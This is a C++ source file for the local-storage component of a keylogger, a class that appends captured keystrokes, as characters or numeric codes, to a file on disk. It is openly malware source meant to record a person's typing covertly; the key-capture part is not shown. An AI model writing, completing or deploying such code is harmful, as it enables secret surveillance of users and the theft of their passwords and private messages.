#include "./keylogger_local.hpp"

keylogger_local::keylogger_local(string p_destination_path) :
		keylogger(), m_ofstream()
{
	m_ofstream.open(p_destination_path.c_str(), std::ofstream::out
			| std::ofstream::app);
}

keylogger_local::~keylogger_local()
{
	m_ofstream.close();
}

void keylogger_local::store()
{
	if(m_store_character == true)
		m_ofstream << m_buffer << endl;
	else
		for (int index = 0; m_buffer[index] != '\0'; index++)
		{
			m_ofstream << (int) m_buffer.at(index) << endl;
		}

	m_ofstream.flush();

	m_buffer.clear();
}
